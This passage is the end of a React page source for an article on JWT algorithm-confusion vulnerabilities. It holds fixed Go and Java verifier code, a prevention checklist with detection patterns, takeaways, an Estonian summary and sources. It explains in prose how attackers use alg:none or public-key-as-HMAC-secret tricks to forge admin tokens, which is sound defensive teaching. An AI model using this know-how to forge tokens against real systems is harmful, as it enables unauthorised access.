              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`// fixed: parser accepts only RS256; any other alg in the header fails
parser := jwt.NewParser(jwt.WithValidMethods([]string{"RS256"}))
claims := &Claims{}
token, err := parser.ParseWithClaims(tokenString, claims, func(t *jwt.Token) (any, error) {
    return publicKey, nil
})`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Java (Auth0 java-jwt) — algorithm-bound verifier
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`// fixed: the Algorithm object binds key type AND algorithm in one step
Algorithm algorithm = Algorithm.RSA256((RSAPublicKey) publicKey, null);
JWTVerifier verifier = JWT.require(algorithm).build();
DecodedJWT decoded = verifier.verify(token);`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Prevention checklist</h3>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Check</th>
                      <th className='py-3 text-slate-100 font-semibold'>How to verify</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        Every verify call pins an explicit algorithms allowlist
                      </td>
                      <td className='py-3 align-top'>
                        Grep for verify/decode calls; Semgrep rules in CI (rules above)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        No verification path branches on the header alg
                      </td>
                      <td className='py-3 align-top'>
                        Code review: any{' '}
                        <code className='text-slate-100'>get_unverified_header</code> or{' '}
                        <code className='text-slate-100'>header.get(&quot;alg&quot;)</code> driving
                        crypto is a finding
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        No custom HMAC/verification code using public keys as secrets
                      </td>
                      <td className='py-3 align-top'>
                        SAST for <code className='text-slate-100'>hmac.new(</code> /
                        <code className='text-slate-100'>crypto.createHmac(</code> fed from key
                        material
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        kid/jku/x5u are server-allowlisted or disabled
                      </td>
                      <td className='py-3 align-top'>
                        Test tokens with attacker-controlled kid/jku; confirm rejection
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        alg:none rejected (regression-tested, including case variants)
                      </td>
                      <td className='py-3 align-top'>
                        Integration test: send a none token to a protected endpoint, expect 401
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        Out-of-allowlist alg values are logged and alerted
                      </td>
                      <td className='py-3 align-top'>
                        Forge an HS256 token in staging; confirm the alert fires
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Key takeaways</h2>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  JWT algorithm confusion is a <em>verification-policy</em> flaw (CWE-347, RFC 8725
                  §2.1): the attacker controls the <code className='text-slate-100'>alg</code>{' '}
                  header, and vulnerable verifiers let it pick the algorithm — and therefore the key
                  interpretation.
                </li>
                <li>
                  Two primitives: <code className='text-slate-100'>alg: none</code> (no signature)
                  and RS256→HS256 (RSA public key as HMAC secret). Both let an attacker mint admin
                  tokens from public information alone.
                </li>
                <li>
                  The bug class is a decade old and still shipping: jsonwebtoken, PyJWT (twice),
                  fast-jwt (twice, most recently 2026), plus the Java ECDSA psychic-signature
                  variant (CVE-2022-21449).
                </li>
                <li>
                  The fix is small and non-negotiable: pin the algorithms allowlist in every verify
                  call (RFC 8725 §3.1), never dispatch on the header, and never let a public key
                  double as an HMAC secret.
                </li>
                <li>
                  Detection is SAST-first (decode-without-allowlist, custom HMAC, disabled signature
                  verification) with alg-header logging as the runtime backstop.
                </li>
              </ul>
            </section>

            <section className='mb-10 border-t border-slate-800 pt-8'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Kokkuvõte eesti keeles</h2>
              <p className='leading-relaxed mb-4'>
                JWT algoritmi segiajamine (ingl k <em>JWT algorithm confusion</em>) on
                allkirjakontrolli nõrkus, kus server usaldab ründaja kontrollitavat{' '}
                <code className='text-slate-100'>alg</code>-päist: ründaja muudab selle väärtuseks{' '}
                <code className='text-slate-100'>none</code> (allkirja pole üldse) või HS256-ks,
                mille puhul kasutatakse HMAC-võtmena serveri avalikku RSA-võtit. Mõlemal juhul saab
                ilma privaatvõtmeta võltsida adminiõigustega märgi. See on CWE-347 ja RFC 8725 §2.1
                kirjeldatud rünnak, mille tõttu on aastate jooksul parandatud jsonwebtokenit,
                PyJWT-d ja fast-jwt-d (viimast koguni 2026. aastal). Parandus: kinnitada
                kontrollimisel alati lubatud algoritmide nimekiri (nt{' '}
                <code className='text-slate-100'>algorithms=[&quot;RS256&quot;]</code>), mitte
                kunagi valida algoritmi päise järgi ega kasutada avalikku võtit HMAC-saladusena.
                Täielik laborikäik ja koodinäited on ülal inglise keeles.
              </p>
            </section>

            <section className='mb-10 border-t border-slate-800 pt-8'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Sources</h2>
              <ul className='list-disc list-inside space-y-1 text-sm'>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.rfc-editor.org/rfc/rfc8725.html'
                  >
                    RFC 8725 — JSON Web Token Best Current Practices (BCP 225), esp. §2.1, §3.1,
                    §3.2
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.rfc-editor.org/rfc/rfc7519.html'
                  >
                    RFC 7519 — JSON Web Token (JWT)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.rfc-editor.org/rfc/rfc7515.html'
                  >
                    RFC 7515 — JSON Web Signature (JWS)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.rfc-editor.org/rfc/rfc7518.html'
                  >
                    RFC 7518 — JSON Web Algorithms (JWA)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html'
                  >
                    OWASP Cheat Sheet Series — JSON Web Token Cheat Sheet
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens'
                  >
                    OWASP WSTG — Testing JSON Web Tokens
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://portswigger.net/web-security/jwt/algorithm-confusion'
                  >
                    PortSwigger Web Security Academy — JWT algorithm confusion attacks
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/'
                  >
                    McLean, T. — Critical vulnerabilities in JSON Web Token libraries (Auth0, 2015;
                    cited by RFC 8725 as [McLean])
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2015-9235'
                  >
                    NVD — CVE-2015-9235 (jsonwebtoken &lt; 4.2.2)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2017-11424'
                  >
                    NVD — CVE-2017-11424 (PyJWT ≤ 1.5.0, PKCS1 PEM key confusion)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2022-29217'
                  >
                    NVD — CVE-2022-29217 (PyJWT &lt; 2.4.0, get_default_algorithms)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2023-48223'
                  >
                    NVD — CVE-2023-48223 (fast-jwt &lt; 3.3.2)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/nearform/fast-jwt/security/advisories/GHSA-mvf2-f6gm-w987'
                  >
                    fast-jwt advisory — CVE-2026-34950, whitespace-prefixed RSA public key (patched
                    6.2.0)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/'
                  >
                    Madden, N. — Psychic Signatures in Java (CVE-2022-21449)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwe.mitre.org/data/definitions/347.html'
                  >
                    CWE-347 — Improper Verification of Cryptographic Signature
                  </a>
                </li>
              </ul>
            </section>
          </div>
        </div>
      </div>
    </>
  );
}
